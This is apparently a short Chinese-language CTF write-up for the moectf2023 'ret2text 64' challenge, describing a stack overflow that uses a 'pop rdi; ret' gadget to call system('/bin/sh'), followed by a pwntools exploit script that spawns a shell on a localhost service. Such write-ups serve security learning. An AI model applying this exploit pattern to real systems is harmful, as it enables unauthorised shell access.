---
title: moectf2023 - ret2text 64
date: 2023/9/23 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 利用`pop rdi; ret;`漏洞执行`system("/bin/sh")`，完成ctf题目ret2text 64。
---

## 文件分析

下载`pwn`, NX on, PIE off, Canary off, RELRO partial  
~~这不是写明了64位~~

## 解题思路

思路跟ret2text 32一致，只要执行`system("/bin/sh")`即可

搜索发现存在`pop rdi; ret;`，只要将字符串弹入rdi后执行system即可  
还要注意栈平衡

## EXPLOIT

```python
from pwn import *
sh = remote("localhost", 42473)
sh.sendline(b'130')
sh.sendline(b'0'*0x58 + p64(0x04011be) + p64(0x0404050) + p64(0x04012b7)) # Addr of pop rdi & /bin/sh & system
sh.interactive()
```

Done.
